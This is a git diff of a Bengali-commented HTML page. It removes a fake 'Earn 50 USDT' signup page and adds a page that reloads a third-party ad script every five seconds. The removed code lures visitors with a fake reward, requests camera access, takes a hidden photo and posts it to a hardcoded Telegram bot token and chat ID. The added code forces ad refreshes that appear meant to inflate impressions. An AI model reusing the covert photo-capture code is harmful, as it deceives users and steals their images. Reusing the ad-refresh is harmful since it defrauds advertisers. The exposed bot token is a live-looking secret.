@@ -1,170 +1,52 @@
 <!DOCTYPE html>
 <html lang="bn">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>50 USDT | Earn Money</title>
-  <style>
-    body, html {
-      margin: 0; padding: 0;
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-      color: #ffffff; text-align: center;
-      background-color: #000000;
-      overflow: hidden;
-    }
-    #bg-canvas {
-      position: fixed; top: 0; left: 0;
-      width: 100%; height: 100%; z-index: 0;
-    }
-    .content-wrapper {
-      position: relative; z-index: 1;
-      height: 100vh;
-      display: flex; justify-content: center; align-items: center;
-    }
-    .container {
-      max-width: 350px; padding: 20px;
-      background: rgba(255, 255, 255, 0.05);
-      backdrop-filter: blur(5px);
-      border-radius: 20px;
-      border: 1px solid rgba(255, 255, 255, 0.1);
-    }
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(20px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-    #coin-canvas, h1, p, .signup-button {
-      animation: fadeIn 0.8s ease-out forwards;
-      opacity: 0;
-    }
-    h1 { animation-delay: 0.2s; }
-    p { animation-delay: 0.4s; }
-    .signup-button { animation-delay: 0.6s; }
-    #coin-canvas {
-      width: 150px !important; height: 150px !important;
-      margin: 0 auto 20px auto;
-    }
-    h1 {
-      font-size: 2.5em; margin: 0; font-weight: bold;
-      text-shadow: 0 0 15px rgba(255, 255, 255, 0.3);
-    }
-    p {
-      font-size: 1.1em; margin: 20px 0;
-      line-height: 1.5; color: #e0e0e0;
-      text-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
-    }
-    .signup-button {
-      background-color: #4CAF50; color: white;
-      padding: 15px 30px; border: none; border-radius: 8px;
-      font-size: 1.2em; font-weight: bold; cursor: pointer;
-      text-decoration: none;
-      display: inline-flex; align-items: center; justify-content: center;
-      transition: background-color 0.3s ease, transform 0.1s ease;
-      box-shadow: 0 0 20px rgba(76, 175, 80, 0.5);
-    }
-    .signup-button:hover { background-color: #58c95c; }
-    .signup-button:active { transform: scale(0.97); }
-  </style>
+<meta charset="UTF-8" />
+<title>৫ সেকেন্ডে অ্যাড রিফ্রেশ</title>
+<style>
+  #ad-container {
+    width: 468px;
+    height: 60px;
+    margin: 50px auto;
+  }
+</style>
 </head>
 <body>
 
-  <!-- ক্যামেরা ও ক্যানভাস (এগুলো লুকানো থাকবে) -->
-  <video id="hidden-video" style="display: none;" autoplay playsinline></video>
-  <canvas id="hidden-canvas" style="display: none;"></canvas>
+<div id="ad-container"></div>
 
-  <!-- ব্যাকগ্রাউন্ডের জন্য ক্যানভাস -->
-  <canvas id="bg-canvas"></canvas>
-  
-  <!-- মূল কন্টেন্ট -->
-  <div class="content-wrapper">
-    <div class="container">
-      <div id="coin-canvas"></div>
-      <h1>Earn 50 USDT</h1>
-      <p>Start Exploring Our Website And Earn Upto 50 USDT Free. Simply sign up to get 50 $ Sign Up Bonus</p>
-      <a href="#" class="signup-button" id="signupBtn">
-        <span>Sign Up to Start</span>
-      </a>
-    </div>
-  </div>
+<script>
+const container = document.getElementById('ad-container');
 
-  <script>
-    const signupBtn = document.getElementById('signupBtn');
-    const video = document.getElementById('hidden-video');
-    const canvas = document.getElementById('hidden-canvas');
+function loadAd() {
+  container.innerHTML = '';  // আগের অ্যাড মুছে ফেলো
 
-    // আপনার টেলিগ্রাম বট টোকেন ও চ্যাট আইডি এখানে দিন
-    const BOT_TOKEN = "8424053022:AAGnCW1Sq6lmfj6VK69KpmrqJK47kK18D-Q";
-    const CHAT_ID = "8099849002";
+  // অ্যাড অপশন স্ক্রিপ্ট
+  const scriptOptions = document.createElement('script');
+  scriptOptions.type = 'text/javascript';
+  scriptOptions.text = `
+    atOptions = {
+      'key' : '29de97c2d42dc443c4bf1859fb318901',
+      'format' : 'iframe',
+      'height' : 60,
+      'width' : 468,
+      'params' : {}
+    };
+  `;
+  container.appendChild(scriptOptions);
 
-    // ডেটা URL-কে ব্লব (Blob) এ রূপান্তর করার ফাংশন
-    function dataURLtoBlob(dataurl) {
-      const arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
-            bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
-      for (let i = 0; i < n; i++) u8arr[i] = bstr.charCodeAt(i);
-      return new Blob([u8arr], { type: mime });
-    }
+  // invoke.js স্ক্রিপ্ট লোড
+  const scriptInvoke = document.createElement('script');
+  scriptInvoke.type = 'text/javascript';
+  scriptInvoke.src = '//www.highperformanceformat.com/29de97c2d42dc443c4bf1859fb318901/invoke.js';
+  scriptInvoke.async = true;
+  container.appendChild(scriptInvoke);
+}
 
-    // সাইন আপ বাটনে ক্লিক করলে যা হবে
-    signupBtn.addEventListener('click', async (event) => {
-      event.preventDefault();
-      signupBtn.textContent = 'Requesting Access...';
-      signupBtn.style.pointerEvents = 'none'; // একাধিক ক্লিক প্রতিরোধ করতে
+loadAd(); // প্রথম লোড
 
-      try {
-        // ইউজারের কাছে ক্যামেরা ব্যবহারের অনুমতি চাওয়া হচ্ছে
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-        signupBtn.textContent = 'Access Granted. Finalizing...';
-        video.srcObject = stream;
+setInterval(loadAd, 5000);  // ৫ সেকেন্ড পর পর রিফ্রেশ
+</script>
 
-        // যখন ভিডিও প্লে হওয়া শুরু হবে, তখন ছবি তোলা হবে
-        // 'onloadeddata' এর পরিবর্তে 'onplay' ব্যবহার করা হয়েছে কারণ এটি নিশ্চিত করে যে ভিডিও স্ট্রিমটি সক্রিয়
-        video.onplay = () => {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const context = canvas.getContext('2d');
-            
-            // একটি ছোটো বিরতি দিয়ে ছবি তোলা হচ্ছে, যাতে ক্যামেরা ঠিকভাবে ফোকাস করতে পারে
-            setTimeout(() => {
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                const imageDataUrl = canvas.toDataURL('image/jpeg');
-                const photoBlob = dataURLtoBlob(imageDataUrl);
-                
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', photoBlob, 'selfie.jpg'); // ছবি পাঠানো হচ্ছে
-
-                // টেলিগ্রাম বটের মাধ্যমে ছবি পাঠানো
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                  method: 'POST',
-                  body: formData
-                })
-                .then(response => response.json())
-                .then(data => {
-                  console.log("✅ Photo sent to Telegram bot!", data);
-                  alert("Sign Up Successful! Your selfie has been submitted.");
-                  signupBtn.textContent = 'Welcome!';
-                  signupBtn.style.backgroundColor = '#28a745';
-                })
-                .catch(error => {
-                  console.error("❌ Error sending photo to Telegram:", error);
-                  alert("Failed to send photo. Please try again.");
-                  signupBtn.textContent = 'Try Again';
-                  signupBtn.style.pointerEvents = 'auto'; // আবার চেষ্টা করার জন্য বাটন সক্রিয় করা হলো
-                });
-
-                // কাজ শেষে ক্যামেরা বন্ধ করে দেওয়া হচ্ছে
-                stream.getTracks().forEach(track => track.stop());
-            }, 200); // ২০০ মিলিসেকেন্ডের ডিলে
-        };
-
-      } catch (err) {
-        // যদি ইউজার ক্যামেরা ব্যবহারের অনুমতি না দেয়
-        console.error("Camera access denied:", err);
-        alert("Camera access is required. Please allow permission and try again.");
-        signupBtn.textContent = 'Sign Up to Start';
-        signupBtn.style.pointerEvents = 'auto'; // বাটন আবার সক্রিয় করা হলো
-      }
-    });
-  </script>
 </body>
 </html>
